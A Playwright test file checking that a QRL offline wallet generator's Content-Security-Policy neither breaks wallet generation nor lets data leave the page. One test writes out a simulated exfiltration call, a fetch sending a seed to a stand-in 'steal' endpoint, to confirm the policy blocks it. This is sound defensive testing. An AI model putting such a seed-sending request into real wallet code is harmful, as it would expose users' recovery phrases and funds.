import { test, expect } from '@playwright/test';
import { createServer } from 'node:http';
import { readFileSync, existsSync } from 'node:fs';
import { resolve, join, extname } from 'node:path';

// The Content-Security-Policy is a shipped security control with, until this
// file, no test coverage: the other specs load the artefact over file://,
// which ignores netlify.toml entirely. A policy that is too strict does not
// fail safe — it breaks the application for every user of the hosted site,
// and it would do so only after deploy.
//
// The policy is parsed out of netlify.toml rather than duplicated here, so
// this test cannot drift from what actually ships.

const DIST = resolve('dist');
const NETLIFY_TOML = resolve('netlify.toml');

function cspFromNetlifyToml() {
  const toml = readFileSync(NETLIFY_TOML, 'utf8');
  const match = toml.match(/^\s*Content-Security-Policy\s*=\s*"([^"]+)"/m);
  if (!match) throw new Error('No Content-Security-Policy found in netlify.toml');
  return match[1];
}

const MIME = {
  '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css',
  '.svg': 'image/svg+xml', '.ico': 'image/x-icon', '.json': 'application/json',
  '.woff2': 'font/woff2', '.png': 'image/png',
};

let server;
let origin;
const csp = cspFromNetlifyToml();

test.beforeAll(async () => {
  if (!existsSync(join(DIST, 'index.html'))) {
    throw new Error('dist/ missing. Run `npm run build` first.');
  }
  server = createServer((req, res) => {
    const urlPath = decodeURIComponent(new URL(req.url, 'http://x').pathname);
    let filePath = join(DIST, urlPath === '/' ? 'index.html' : urlPath);
    // Mirror netlify.toml's SPA fallback.
    if (!existsSync(filePath)) filePath = join(DIST, 'index.html');
    res.setHeader('Content-Type', MIME[extname(filePath)] || 'application/octet-stream');
    res.setHeader('Content-Security-Policy', csp);
    res.end(readFileSync(filePath));
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  origin = `http://127.0.0.1:${server.address().port}`;
});

test.afterAll(() => server?.close());

/** Collects CSP violations reported by the page itself, plus console errors. */
async function watchViolations(page) {
  const violations = [];
  await page.addInitScript(() => {
    window.__cspViolations = [];
    document.addEventListener('securitypolicyviolation', (e) => {
      window.__cspViolations.push(`${e.violatedDirective} blocked ${e.blockedURI || '(inline)'}`);
    });
  });
  page.on('console', (msg) => {
    const text = msg.text();
    if (/Content Security Policy|Refused to/i.test(text)) violations.push(text);
  });
  return violations;
}

test('the shipped CSP does not break a full wallet-generation session', async ({ page }) => {
  const consoleViolations = await watchViolations(page);
  await page.goto(origin);

  // If the policy blocked the bundle or the WASM, the app never mounts.
  await expect(page.locator('h1.card-title')).toHaveText('QRL Offline Wallet Generator');
  await expect(page.getByText('QRL Library loaded')).toBeVisible();

  await page.getByRole('button', { name: 'Generate', exact: true }).click();
  await expect(page.locator('#mnemonic')).not.toBeEmpty({ timeout: 90_000 });

  const mnemonic = await page.locator('#mnemonic').innerText();
  expect(mnemonic.trim().split(/\s+/)).toHaveLength(34);

  // Encryption exercises WebCrypto and scrypt-js under the policy.
  const PW = 'Xk7#mQp2Lv9w';
  await page.getByPlaceholder('Enter password').fill(PW);
  await page.getByPlaceholder('Confirm password').fill(PW);
  const download = page.waitForEvent('download', { timeout: 90_000 });
  await page.getByRole('button', { name: /Save encrypted/ }).click();
  expect((await download).suggestedFilename()).toBe('wallet.json');

  const pageViolations = await page.evaluate(() => window.__cspViolations || []);
  expect(
    [...pageViolations, ...consoleViolations],
    'the CSP blocked something the application needs',
  ).toEqual([]);
});

test('connect-src none actually blocks exfiltration', async ({ page }) => {
  // The directive the policy exists for. If this ever starts passing, the CSP
  // has been loosened and the seed can leave the page.
  await page.goto(origin);
  const blocked = await page.evaluate(async () => {
    try {
      await fetch('https://example.invalid/steal?seed=abc', { mode: 'no-cors' });
      return false;
    } catch {
      return true;
    }
  });
  expect(blocked, 'connect-src did not block an outbound request').toBe(true);
});
